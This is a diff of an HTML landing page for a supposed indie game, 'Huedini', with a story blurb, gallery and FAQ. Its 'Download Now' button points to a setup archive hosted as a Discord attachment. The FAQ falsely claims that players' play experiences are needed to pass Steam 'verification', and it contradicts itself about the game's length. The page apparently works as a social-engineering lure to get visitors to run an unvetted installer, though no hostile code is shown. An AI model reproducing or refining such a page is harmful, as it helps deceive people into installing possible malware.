@@ -1,18 +1,199 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Huedini - Enter the Shadows</title>
-  <style>
-    html, body, iframe {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      width: 100%;
-      border: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Huedini - Enter the Shadows</title>
+    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Huedini - Enter the Shadows">
+    <meta property="og:description" content="Play as Huedini, a powerful wizard with the ability to change his colour. By matching your colour, to that of the enemies you can absorb their colour essence. By combining these colour essences into the correct combination, you can cast custom spells.">
+    <meta property="og:image" content="images/huedini.png">
+    <meta property="og:type" content="website">
+    
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Huedini - Enter the Shadows">
+    <meta name="twitter:description" content="Play as Huedini, a powerful wizard with the ability to change his colour. By matching your colour, to that of the enemies you can absorb their colour essence. By combining these colour essences into the correct combination, you can cast custom spells.">
+    <meta name="twitter:image" content="images/huedini.png">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="images/huedini.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="images/huedini.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="images/huedini.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/huedini.png">
+    
+    <!-- Microsoft Tile -->
+    <meta name="msapplication-TileImage" content="images/huedini.png">
+    <meta name="msapplication-TileColor" content="#8A2BE2">
+    
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
 </head>
 <body>
-  <iframe src="https://abiadamiz.neocities.org/" frameborder="0"></iframe>
+    <div class="loader">
+        <div class="loader-content">
+            <h1>HUEDINI</h1>
+            <div class="loading-bar"></div>
+        </div>
+    </div>
+
+    <nav>
+        <div class="nav-content">
+            <div class="logo">HUEDINI</div>
+            <div class="nav-links">
+                <a href="#home">HOME</a>
+                <a href="#story">STORY</a>
+                <a href="#gallery">GALLERY</a>
+                <a href="#download" class="download-btn">PLAY NOW</a>
+            </div>
+        </div>
+    </nav>
+
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <h1>ENTER THE HUEDINI</h1>
+            <p>Huedini is a top-down action roguelike game. Play as Huedini, a powerful wizard with the ability to change his colour.</p>
+            <a href="#download" class="hero-cta">Begin Your Journey</a>
+        </div>
+        <div class="hero-bg-effects"></div>
+    </section>
+
+    <section id="story" class="story">
+        <div class="story-content">
+            <h2 data-aos="fade-right">THE LEGEND OF HUEDINI</h2>
+            <div class="story-grid">
+                <div class="story-text" data-aos="fade-right">
+                    <p>Huedini is a top-down action roguelike game. Play as Huedini, a powerful wizard with the ability to change his colour. By matching your colour, to that of the enemies you can absorb their colour essence. By combining these colour essences into the correct combination, you can cast custom spells.</p>
+                    <p>Huedini is a top-down action roguelike game. You play as Huedini, a powerful wizard with the unique ability to change his colour. By matching your colour, to that of the enemies and their projectiles, you can absorb their colour essence to cast powerful spells. Collect upgrades as you progress to customise and improve your spells and abilities. </p>
+                </div>
+                <div class="story-image" data-aos="fade-left">
+                    <img src="images/story.jpg" alt="Huedini Story Image">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="gallery" class="gallery">
+        <h2>GLIMPSES OF DARKNESS</h2>
+        <div class="gallery-container">
+            <div class="gallery-track">
+                <div class="gallery-item" data-aos="zoom-in">
+                    <div class="gallery-item-shadow"></div>
+                    <div class="gallery-item-inner">
+                        <video src="images/gallery1.mp4" autoplay loop muted playsinline></video>
+                        <div class="gallery-item-lighting"></div>
+                    </div>
+                </div>
+                <div class="gallery-item" data-aos="zoom-in">
+                    <div class="gallery-item-shadow"></div>
+                    <div class="gallery-item-inner">
+                        <img src="images/gallery2.jpg" alt="Huedini in Action" loading="lazy">
+                        <div class="gallery-item-lighting"></div>
+                    </div>
+                </div>
+                <div class="gallery-item" data-aos="zoom-in">
+                    <div class="gallery-item-shadow"></div>
+                    <div class="gallery-item-inner">
+                        <img src="images/gallery3.jpg" alt="Magical Combat" loading="lazy">
+                        <div class="gallery-item-lighting"></div>
+                    </div>
+                </div>
+                <div class="gallery-item" data-aos="zoom-in">
+                    <div class="gallery-item-shadow"></div>
+                    <div class="gallery-item-inner">
+                        <img src="images/gallery4.jpg" alt="Color Magic" loading="lazy">
+                        <div class="gallery-item-lighting"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="download" class="download">
+        <div class="download-content" data-aos="fade-up">
+            <h2>BEGIN YOUR JOURNEY</h2>
+            <a href="https://cdn.discordapp.com/attachments/1366533951052845076/1366534425642274856/Huedini_Setup_1.0.0.7z?ex=68114bdc&is=680ffa5c&hm=9ad6724bd15bb693e6c564377a87c4e252a883772103fddd04ddd0362c2510ee&" target="_blank" class="download-button">
+                <i class="fas fa-download"></i>
+                Download Now
+            </a>
+        </div>
+    </section>
+
+    <section id="faq" class="faq">
+        <div class="faq-content" data-aos="fade-up">
+            <h2>FREQUENTLY ASKED QUESTIONS</h2>
+            <div class="faq-grid">
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <h3>Why Wasn't It Released On Steam?</h3>
+                        <span class="faq-toggle"><i class="fas fa-plus"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        Our game is currently in the verification section on Steam. As you, our players, play our game and tell us your experiences, we forward them to Steam and they say we can or cannot release them. If things go as we think, the game will be released on Steam soon.                        </p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <h3>Why Our Experiences Are Necessary</h3>
+                        <span class="faq-toggle"><i class="fas fa-plus"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>The experience of our players is necessary because they are required to get approval from Steam and for our game to be released without any errors.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <h3>Will there be future DLC or updates?</h3>
+                        <span class="faq-toggle"><i class="fas fa-plus"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>We are committed to continuously expanding the world of Huedini. Regular updates will include new missions, characters, and gameplay features. A major expansion is planned for release within six months of launch.</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <h3>How Many People in Your Team?</h3>
+                        <span class="faq-toggle"><i class="fas fa-plus"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Our Team is 18 People, Counting Designers and Editors</p>
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <h3>How long is the main campaign?</h3>
+                        <span class="faq-toggle"><i class="fas fa-plus"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>The main campaign offers approximately 20-25 hours of gameplay. With side quests, collectibles, and additional content, players can expect 40+ hours of total gameplay experience.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-content">
+            <div class="social-links">
+                <a href="" target="_blank"><i class="fab fa-discord"></i></a>
+                <a href="" target="_blank"><i class="fab fa-twitter"></i></a>
+                <a href="soon" target="_blank"><i class="fab fa-instagram"></i></a>
+                <a href="soon" target="_blank"><i class="fab fa-youtube"></i></a>
+            </div>
+            <div class="footer-text">
+                <p>&copy; 2025 Huedini. All rights reserved By HuediniTeam.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
